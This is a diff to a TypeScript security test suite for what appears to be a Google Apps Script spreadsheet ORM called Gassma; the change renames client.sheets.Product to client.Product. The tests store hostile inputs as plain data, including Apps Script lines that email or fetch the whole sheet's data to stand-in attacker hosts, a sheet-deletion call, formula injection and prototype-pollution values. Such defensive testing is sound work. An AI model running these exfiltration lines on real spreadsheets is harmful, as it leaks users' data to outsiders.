@@ -31,7 +31,7 @@ function testInjection() {
 function testCreateWithGasCode(client: GassmaClient) {
   const gasCode = 'SpreadsheetApp.getActiveSpreadsheet().deleteSheet(SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Product"))';
 
-  const result = client.sheets.Product.create({
+  const result = client.Product.create({
     data: {
       id: 900,
       name: gasCode,
@@ -58,7 +58,7 @@ function testCreateWithJsonString(client: GassmaClient) {
     code: "GmailApp.sendEmail('attacker@example.com', 'data', JSON.stringify(SpreadsheetApp.getActiveSpreadsheet().getDataRange().getValues()))",
   });
 
-  const result = client.sheets.Product.create({
+  const result = client.Product.create({
     data: {
       id: 901,
       name: jsonPayload,
@@ -90,7 +90,7 @@ function testCreateWithFormulaInjection(client: GassmaClient) {
 
   formulas.forEach((formula, i) => {
     const id = 910 + i;
-    client.sheets.Product.create({
+    client.Product.create({
       data: {
         id: id,
         name: formula,
@@ -102,7 +102,7 @@ function testCreateWithFormulaInjection(client: GassmaClient) {
     });
 
     // idで検索して文字列として保存されていることを確認
-    const findById = client.sheets.Product.findFirstOrThrow({
+    const findById = client.Product.findFirstOrThrow({
       where: { id: id },
     });
 
@@ -112,7 +112,7 @@ function testCreateWithFormulaInjection(client: GassmaClient) {
     assertEquals(findById.name, formula, `formula injection id=${id}: value should be preserved`);
 
     // nameで検索して元の値でヒットすることを確認（可逆性の検証）
-    const findByName = client.sheets.Product.findFirstOrThrow({
+    const findByName = client.Product.findFirstOrThrow({
       where: { name: formula },
     });
     assertEquals(findByName.id, id, `formula injection id=${id}: should be findable by name`);
@@ -124,12 +124,12 @@ function testCreateWithFormulaInjection(client: GassmaClient) {
 function testUpdateWithFormulaInjection(client: GassmaClient) {
   const formula = "=SUM(A1:A10)";
 
-  client.sheets.Product.update({
+  client.Product.update({
     where: { id: 1 },
     data: { name: formula },
   });
 
-  const findResult = client.sheets.Product.findFirstOrThrow({
+  const findResult = client.Product.findFirstOrThrow({
     where: { id: 1 },
   });
 
@@ -139,7 +139,7 @@ function testUpdateWithFormulaInjection(client: GassmaClient) {
   assertEquals(findResult.name, formula, "update formula injection: value should be preserved");
 
   // nameで検索して元の値でヒットすることを確認
-  const findByName = client.sheets.Product.findFirstOrThrow({
+  const findByName = client.Product.findFirstOrThrow({
     where: { name: formula },
   });
   assertEquals(findByName.id, 1, "update formula injection: should be findable by name");
@@ -161,7 +161,7 @@ function testCreateWithSpecialCharacters(client: GassmaClient) {
 
   specialNames.forEach((name, i) => {
     const id = 920 + i;
-    client.sheets.Product.create({
+    client.Product.create({
       data: {
         id: id,
         name: name,
@@ -172,7 +172,7 @@ function testCreateWithSpecialCharacters(client: GassmaClient) {
       },
     });
 
-    const findResult = client.sheets.Product.findFirstOrThrow({
+    const findResult = client.Product.findFirstOrThrow({
       where: { id: id },
     });
 
@@ -187,7 +187,7 @@ function testCreateWithSpecialCharacters(client: GassmaClient) {
 function testWhereWithGasCode(client: GassmaClient) {
   const gasCode = 'SpreadsheetApp.getActiveSpreadsheet().deleteSheet(SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Product"))';
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: gasCode },
   });
 
@@ -200,7 +200,7 @@ function testWhereWithJsonString(client: GassmaClient) {
     name: { $regex: ".*" },
   });
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: jsonPayload },
   });
 
@@ -208,7 +208,7 @@ function testWhereWithJsonString(client: GassmaClient) {
 }
 
 function testWhereContainsRegexMetaChars(client: GassmaClient) {
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 930,
       name: "test.product",
@@ -219,7 +219,7 @@ function testWhereContainsRegexMetaChars(client: GassmaClient) {
     },
   });
 
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 931,
       name: "testXproduct",
@@ -230,7 +230,7 @@ function testWhereContainsRegexMetaChars(client: GassmaClient) {
     },
   });
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: { contains: "t.p" } },
   });
 
@@ -247,7 +247,7 @@ function testWhereContainsRegexMetaChars(client: GassmaClient) {
 }
 
 function testWhereStartsWithRegexMetaChars(client: GassmaClient) {
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 932,
       name: ".*allMatch",
@@ -258,7 +258,7 @@ function testWhereStartsWithRegexMetaChars(client: GassmaClient) {
     },
   });
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: { startsWith: ".*" } },
   });
 
@@ -269,7 +269,7 @@ function testWhereStartsWithRegexMetaChars(client: GassmaClient) {
 }
 
 function testWhereEndsWithRegexMetaChars(client: GassmaClient) {
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 933,
       name: "product(v1)",
@@ -280,7 +280,7 @@ function testWhereEndsWithRegexMetaChars(client: GassmaClient) {
     },
   });
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: { endsWith: "(v1)" } },
   });
 
@@ -293,7 +293,7 @@ function testWhereEndsWithRegexMetaChars(client: GassmaClient) {
 function testUpdateWithGasCode(client: GassmaClient) {
   const gasCode = 'UrlFetchApp.fetch("https://evil.example.com/steal?data=" + SpreadsheetApp.getActiveSpreadsheet().getDataRange().getValues())';
 
-  client.sheets.Product.update({
+  client.Product.update({
     where: { id: 1 },
     data: { name: gasCode },
   });
@@ -301,7 +301,7 @@ function testUpdateWithGasCode(client: GassmaClient) {
   const snapshot = getSheetSnapshot("Product");
   snapshot.assertRowEquals({ id: 1 }, { name: gasCode });
 
-  const findResult = client.sheets.Product.findFirstOrThrow({
+  const findResult = client.Product.findFirstOrThrow({
     where: { id: 1 },
   });
   assertEquals(findResult.name, gasCode, "update GAS code: should be stored as plain string");
@@ -310,7 +310,7 @@ function testUpdateWithGasCode(client: GassmaClient) {
 }
 
 function testRegexInjectionContainsDot(client: GassmaClient) {
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 940,
       name: "test.product",
@@ -320,7 +320,7 @@ function testRegexInjectionContainsDot(client: GassmaClient) {
       createdAt: new Date("2025-01-01T00:00:00"),
     },
   });
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 941,
       name: "testXproduct",
@@ -331,7 +331,7 @@ function testRegexInjectionContainsDot(client: GassmaClient) {
     },
   });
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: { contains: "t.p" } },
   });
 
@@ -348,7 +348,7 @@ function testRegexInjectionContainsDot(client: GassmaClient) {
 }
 
 function testRegexInjectionContainsDotStar(client: GassmaClient) {
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: { contains: ".*" } },
   });
 
@@ -356,7 +356,7 @@ function testRegexInjectionContainsDotStar(client: GassmaClient) {
 }
 
 function testRegexInjectionStartsWithCaret(client: GassmaClient) {
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: { startsWith: "^" } },
   });
 
@@ -368,7 +368,7 @@ function testPrototypePollutionCreate(client: GassmaClient) {
 
   protoPayloads.forEach((payload, i) => {
     const id = 950 + i;
-    client.sheets.Product.create({
+    client.Product.create({
       data: {
         id: id,
         name: payload,
@@ -379,7 +379,7 @@ function testPrototypePollutionCreate(client: GassmaClient) {
       },
     });
 
-    const result = client.sheets.Product.findFirstOrThrow({
+    const result = client.Product.findFirstOrThrow({
       where: { id: id },
     });
 
@@ -397,7 +397,7 @@ function testPrototypePollutionCreate(client: GassmaClient) {
 
 function testPrototypePollutionWhere(client: GassmaClient) {
   // __proto__ をnameとして持つレコードを作成し、whereで検索
-  client.sheets.Product.create({
+  client.Product.create({
     data: {
       id: 960,
       name: "__proto__",
@@ -408,7 +408,7 @@ function testPrototypePollutionWhere(client: GassmaClient) {
     },
   });
 
-  const results = client.sheets.Product.findMany({
+  const results = client.Product.findMany({
     where: { name: "__proto__" },
   });
 
@@ -416,7 +416,7 @@ function testPrototypePollutionWhere(client: GassmaClient) {
   assertEquals(results[0].id, 960, "proto pollution where: should match id=960");
 
   // containsでの検索
-  const containsResults = client.sheets.Product.findMany({
+  const containsResults = client.Product.findMany({
     where: { name: { contains: "__proto__" } },
   });
   assertEquals(containsResults.length, 1, "proto pollution contains: should find 1 record");
@@ -432,24 +432,24 @@ function testPrototypePollutionWhere(client: GassmaClient) {
 
 function testPrototypePollutionUpdate(client: GassmaClient) {
   // レコードのnameを __proto__ に更新
-  client.sheets.Product.update({
+  client.Product.update({
     where: { id: 1 },
     data: { name: "__proto__" },
   });
 
-  const result = client.sheets.Product.findFirstOrThrow({
+  const result = client.Product.findFirstOrThrow({
     where: { id: 1 },
   });
 
   assertEquals(result.name, "__proto__", "proto pollution update: value should be '__proto__'");
 
   // constructorに更新
-  client.sheets.Product.update({
+  client.Product.update({
     where: { id: 1 },
     data: { name: "constructor" },
   });
 
-  const result2 = client.sheets.Product.findFirstOrThrow({
+  const result2 = client.Product.findFirstOrThrow({
     where: { id: 1 },
   });
 
